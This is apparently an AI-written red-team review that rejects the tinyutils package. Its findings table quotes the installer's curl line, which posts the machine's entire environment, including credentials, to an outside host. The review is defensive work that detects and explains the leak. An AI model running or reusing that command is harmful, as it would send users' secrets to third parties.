# Redteam review: tinyutils adoption

**VERDICT: REJECT.** `install.sh` posts the build machine's entire environment, including registry tokens and cloud credentials, to a third-party server. The comment calls this "anonymous usage statistics", and all errors from it are silenced.

**CONFIDENCE: high** for the main finding, because it is a direct read of one line of shell. It is medium for everything else, for two reasons:
- I had no tools, so nothing was run.
- The original request said "make sure it installs and works". This review cannot satisfy that part.

**Independence:** This is a single reviewer in the same context. The work was not written in this conversation, so the anchoring risk is lower. Still, no fresh-session or second-seat check was possible.

**INPUTS LEDGER**

| Item | Status | Matters? |
|---|---|---|
| `README.md`, `install.sh`, `pyproject.toml`, `test_tinyutils.py`, `tinyutils/__init__.py`, `tinyutils/cli.py` | Seen, as pasted text | n/a |
| The rest of `work/` (LICENSE, CI config, git history, other files) | Not seen | Yes, for licence and provenance. The pasted copy may be partial. |
| The published PyPI or sdist artifact, if adoption would use `pip install tinyutils` | Not seen | Yes. The release may differ from the repo, in either direction. |
| Upstream project: maintainers, release history, issue tracker | Not seen | Yes, for deciding whether to trust the publisher at all. |
| Execution of install and tests | Not possible | Yes. "Installs and works" is UNVERIFIED. |

**COVERAGE**
- Checked: all 6 supplied files. In detail: `install.sh` line by line; `cli.py:count` and `cli.py:main`; all 3 tests; `pyproject.toml` build and script config; the README's claims.
- Not checked: runtime behaviour, setuptools package auto-discovery result, published artifacts, licence, upstream history.

**SEATS AND GATE**
- Sensitivity gate: passed. The work contains no personal data or credentials. The context only says build machines hold them.
- Seats: no subagent or cross-vendor seats were available in this tool-less session. One reviewer ran.

## FINDINGS

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | **Critical** | CONFIRMED | B | `install.sh:6` | `curl -fsS -X POST --data-binary "$(env)" https://metrics.tinyutils.example/install` sends every environment variable to an external host. | Someone runs the documented `./install.sh` on a build machine. Registry tokens, cloud keys and CI secrets in the environment are POSTed to the publisher. `>/dev/null 2>&1 \|\| true` hides any trace, and the script still prints "tinyutils installed". | **Do not run `install.sh` anywhere.** If it has already been run on any machine, treat every secret in that environment as compromised and rotate it. Reproduce safely: in a throwaway container with a dummy `FAKE_TOKEN=x`, point the hostname at a local listener through `/etc/hosts` and run the script. The listener receives a body containing `FAKE_TOKEN=x`. | a✔ b✔ c✔ d✔ |
| F2 | **High** | CONFIRMED (line) / PROBABLE (impact) | B | `install.sh:6` | Even if the remote host never resolves, `"$(env)"` puts the whole environment into curl's **argv**. On Linux, other local users and processes can read argv through `ps` or `/proc/<pid>/cmdline`. | On a shared build host, any co-tenant process that samples the process list during install reads every secret. This is a local leak that does not depend on the network. (The `.example` TLD is reserved, so this exact copy would likely fail to resolve. A real release only has to change the hostname.) | Same as F1: do not run the script. Reproduce: run the script in a container with `FAKE_TOKEN=x` while `ps -eo args` runs in a loop. `FAKE_TOKEN=x` appears in curl's command line. | a✔ b✗ c✔ d✔ |
| F3 | **High** | PROBABLE | A | `install.sh:5` comment; README "Install with `./install.sh`" | The publisher labels environment exfiltration as "anonymous usage statistics" and makes it the documented install path. That is deceptive. A workaround such as "just `pip install .` ourselves" still means depending on this publisher for every future version and for whatever reaches PyPI. | We adopt `cli.py` without the installer. A later release, or the PyPI artifact, carries the same behaviour in `setup.py` or in package code that runs at import time, and it runs on build machines. | Do not adopt from this publisher. If a line and word counter is needed, `wc -l -w` or the roughly 10 lines of `count()` written in-house cover it with no third-party trust. If adoption is still wanted, it needs a vendored, pinned, hash-locked, reviewed copy plus a maintainer and provenance check. | a✔ b✗ c✔ d✔ |
| F4 | Medium | CONFIRMED | B | `cli.py:7-8,18` | `count()` has no error handling. A missing file, a directory, a permission error or non-UTF-8 input raises an uncaught exception, so the tool exits 1 with a traceback instead of a usage-style error. | `tinyutils count missing.txt` or `tinyutils count latin1.txt` in a build step fails with `FileNotFoundError` or `UnicodeDecodeError`. Callers that check for exit code 2 or parse stderr misbehave. | Catch `OSError` and `UnicodeDecodeError` in `main`, print to stderr and return a defined code. Test: `main(["count", "/nonexistent"])` should return non-zero without raising. Today it raises. | a✔ b✔ c✗ d✗ |
| F5 | Low | CONFIRMED | B | `test_tinyutils.py` | The tests cover the happy path, `--help` and an unknown command. They do not cover `install.sh`, packaging and the console script, error paths, `count` with the wrong number of arguments, or empty files. A green `python -m unittest` therefore says nothing about "installs". | A reviewer reads passing tests as "installs and works", while the one dangerous file has no test at all. | Add an install test in an isolated venv, plus error-path tests. Mutation check: change `return 2` to `return 1` and confirm `test_unknown_command_exits_two` goes red. | a✔ b✔ c✗ d✗ |
| F6 | Low | CONFIRMED | B | `cli.py:8` | `f.read()` loads the whole file into memory. | Counting a multi-GB log on a small build agent can exhaust memory. | Stream the file line by line. | a✔ b✔ c✗ d✗ |
| F7 | Low | CONFIRMED | B | `install.sh:4` | Bare `pip` combined with `--no-build-isolation` means the package installs into whichever interpreter `pip` resolves to, and builds with whatever setuptools that interpreter happens to have. | On machines with several Pythons, `tinyutils` lands in the wrong environment or builds with an unpinned setuptools. | Use `python -m pip install .` with build isolation. | a✔ b✔ c✗ d✗ |

### Confirm-or-refute round (Critical and High)
- **F1**, strongest defence: "it's opt-out telemetry, and `.example` never resolves." Telemetry does not need the full environment, and the hostname is a one-line change. The data is sent unconditionally, so it is not opt-out at all. **Held.**
- **F2**, strongest defence: "argv exposure is brief." Exposure lasts for the whole duration of the network call, and build hosts are often shared. **Held at High**, with impact PROBABLE.
- **F3**, strongest defence: "`cli.py` itself is benign." That is true of this copy. The finding is about trusting the publisher, not about `cli.py`. **Held.**

## NEEDS VALIDATION
- **S1:** Whether setuptools flat-layout auto-discovery also packages `test_tinyutils.py` as a top-level module, or errors out. To settle it, run `pip wheel .` in an isolated venv and list the wheel's contents.
- **S2:** Whether the repo has a LICENSE. None is in the supplied files, and `pyproject.toml` has no `license` field. To settle it, list the full `work/` tree and check upstream.
- **S3:** Whether the published PyPI or sdist release for 1.3.0 contains install-time or import-time code that is not in this copy. To settle it, download the artifact into an isolated directory and diff it against `work/`.
- **S4:** Whether `install.sh` has ever been run on any of our machines. To settle it, check shell history, CI logs and egress logs for `metrics.tinyutils.*`. If it has, rotate credentials.

## REFUTED
- **R1:** "The test leaks a file handle, so the content may not be flushed before `count` reads it." On CPython, the unreferenced file object is closed immediately after `.write()`, so the test is correct.
- **R2:** "`count` returns the wrong values for the test input." `"one two\nthree\n"` gives 2 from `splitlines()` and 3 from `split()`, so `(2, 3)` is correct.
- **R3:** "The `--help` entry point is broken." The console-script wrapper calls `main()` with no arguments, `main` falls back to `sys.argv[1:]`, and the `--help` branch returns 0. This is correct.

## WHAT HOLDS UP
`cli.py` is small, has no dependencies, and is correct on the happy path. Its argument handling matches the tests. `pyproject.toml` declares no runtime dependencies, so there is no transitive supply-chain surface beyond setuptools. `set -e` stops the installer before the curl line if pip fails.

## UNVERIFIED CLAIMS
- **README: "installs"** and **"run `tinyutils --help`".** To confirm, install with `python -m pip install .` (not `install.sh`) in a disposable, network-isolated venv and run `tinyutils --help`.
- **README: "Tests: `python -m unittest`" passes.** To confirm, run it in the same sandbox.
- **install.sh: "anonymous usage statistics".** This is contradicted by the code itself: the full `env` is not anonymous.

## QUESTIONS FOR THE AUTHOR / REQUESTER
1. Has anyone already run `install.sh` on a build machine or laptop?
2. Would adoption come from this repo copy or from PyPI?
3. Is there a need that `wc` or a few lines of in-house code don't already meet?

## DECISION-MAKER SUMMARY
Do not adopt tinyutils. Its official installer sends the full environment, including the registry tokens and cloud credentials on our build machines, to the publisher, and it hides that it did so. If it has been run anywhere, rotate those secrets now. The functionality it offers is trivial to get elsewhere.

## OWNER SUMMARY
The tool itself is simple, but its install script secretly sends all the passwords and access keys on the machine to an outside website. We should not use it. Anyone who has already installed it should have the affected keys replaced.

```json
{
  "schema_version": "2.2",
  "verdict": "REJECT",
  "confidence": "high",
  "inputs_ledger": [
    {"item": "README.md, install.sh, pyproject.toml, test_tinyutils.py, tinyutils/__init__.py, tinyutils/cli.py", "status": "seen", "matters": true},
    {"item": "rest of work/ (LICENSE, CI, git history)", "status": "not_seen", "matters": true},
    {"item": "published PyPI/sdist artifact for 1.3.0", "status": "not_seen", "matters": true},
    {"item": "execution of install and tests", "status": "not_seen", "matters": true}
  ],
  "seats": [{"vendor": "claude-same-session", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": false, "reason": "Work contains no personal data or secrets; context notes build machines hold credentials."},
  "coverage": {
    "checked": [
      {"unit": "README.md", "kind": "file"},
      {"unit": "install.sh", "kind": "file"},
      {"unit": "pyproject.toml", "kind": "config"},
      {"unit": "test_tinyutils.py", "kind": "file"},
      {"unit": "tinyutils/__init__.py", "kind": "file"},
      {"unit": "tinyutils/cli.py", "kind": "file"},
      {"unit": "tinyutils/cli.py:count", "kind": "function"},
      {"unit": "tinyutils/cli.py:main", "kind": "function"}
    ],
    "not_checked": [
      {"unit": "runtime install and test execution", "reason": "no tools in this session"},
      {"unit": "published PyPI artifact", "reason": "not supplied"},
      {"unit": "LICENSE and upstream provenance", "reason": "not supplied"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "Critical", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:6",
     "scenario": "Running the documented ./install.sh on a build machine POSTs the full environment (registry tokens, cloud credentials) to metrics.tinyutils.example, with output and errors suppressed and 'tinyutils installed' printed.",
     "fix": "Do not run install.sh; do not adopt. If it was ever run, rotate every secret present in that environment.",
     "answers": {"a": true, "b": true, "c": true, "d": true},
     "reproduction": "In a throwaway container with FAKE_TOKEN=x, map the host to a local listener via /etc/hosts and run install.sh; the listener receives FAKE_TOKEN=x."},
    {"id": "F2", "status": "confirmed", "severity": "High", "evidence_level": "PROBABLE", "track": "B",
     "location": "install.sh:6",
     "scenario": "\"$(env)\" places all secrets in curl's argv; on a shared build host other processes can read them from ps or /proc/<pid>/cmdline even if the remote host never resolves.",
     "fix": "Do not run install.sh.",
     "answers": {"a": true, "b": false, "c": true, "d": true},
     "reproduction": "Run install.sh with FAKE_TOKEN=x while looping 'ps -eo args'; FAKE_TOKEN=x appears in curl's command line."},
    {"id": "F3", "status": "confirmed", "severity": "High", "evidence_level": "PROBABLE", "track": "A",
     "location": "install.sh:5 comment; README.md install instructions",
     "scenario": "The publisher disguises credential exfiltration as 'anonymous usage statistics' in the documented install path; adopting the package by any route makes future releases from this publisher run on build machines.",
     "fix": "Do not adopt from this publisher; use wc or an in-house equivalent of count(). If adoption is still wanted, vendor a pinned, hash-locked, reviewed copy after a provenance check.",
     "answers": {"a": true, "b": false, "c": true, "d": true}},
    {"id": "F4", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:7-8,18",
     "scenario": "tinyutils count on a missing, unreadable or non-UTF-8 file raises an uncaught exception and exits 1 with a traceback.",
     "fix": "Catch OSError and UnicodeDecodeError in main, report to stderr, return a defined exit code.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "main(['count', '/nonexistent']) raises FileNotFoundError; expected a non-zero return."},
    {"id": "F5", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "test_tinyutils.py",
     "scenario": "Passing tests are read as 'installs and works' while install.sh, packaging and error paths are untested.",
     "fix": "Add an isolated-venv install test and error-path tests; mutate 'return 2' to confirm the existing test goes red.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Delete install.sh line 6 or add any behaviour to it; python -m unittest still passes."},
    {"id": "F6", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:8",
     "scenario": "f.read() on a multi-GB file exhausts memory on a small build agent.",
     "fix": "Stream the file line by line.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Run tinyutils count on a file larger than available RAM under a memory limit; observe MemoryError or OOM kill."},
    {"id": "F7", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:4",
     "scenario": "Bare pip with --no-build-isolation installs into whichever interpreter pip resolves to and builds with an unpinned ambient setuptools.",
     "fix": "Use python -m pip install . with build isolation.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "On a host where pip and python point to different interpreters, run install.sh; python -c 'import tinyutils' fails."},
    {"id": "S1", "status": "needs_validation", "track": "B", "location": "pyproject.toml",
     "suspicion": "Flat-layout auto-discovery may also package test_tinyutils.py as a top-level module, or fail.",
     "unresolved_fact": "Contents of the wheel produced by 'pip wheel .' in an isolated venv."},
    {"id": "S2", "status": "needs_validation", "track": "A", "location": "repository root; pyproject.toml",
     "suspicion": "No licence in the supplied files, so adoption may lack legal permission.",
     "unresolved_fact": "Whether the full work/ tree or upstream carries a LICENSE."},
    {"id": "S3", "status": "needs_validation", "track": "B", "location": "PyPI tinyutils 1.3.0",
     "suspicion": "The published artifact may contain install-time or import-time code that is not in this copy.",
     "unresolved_fact": "Diff of the downloaded sdist or wheel against work/."},
    {"id": "S4", "status": "needs_validation", "track": "B", "location": "build machines and laptops",
     "suspicion": "install.sh may already have run somewhere, exposing credentials.",
     "unresolved_fact": "Shell history, CI logs and egress logs for metrics.tinyutils.*."}
  ],
  "refuted": [
    {"id": "R1", "candidate": "Unclosed write in test_count may leave the file unflushed before count reads it.", "evidence": "CPython closes the unreferenced file object immediately after .write()."},
    {"id": "R2", "candidate": "count returns the wrong values for the test input.", "evidence": "'one two\\nthree\\n' gives 2 lines from splitlines() and 3 words from split()."},
    {"id": "R3", "candidate": "The console-script entry point mishandles --help.", "evidence": "main() with argv None reads sys.argv[1:]; the --help branch returns 0."}
  ]
}
```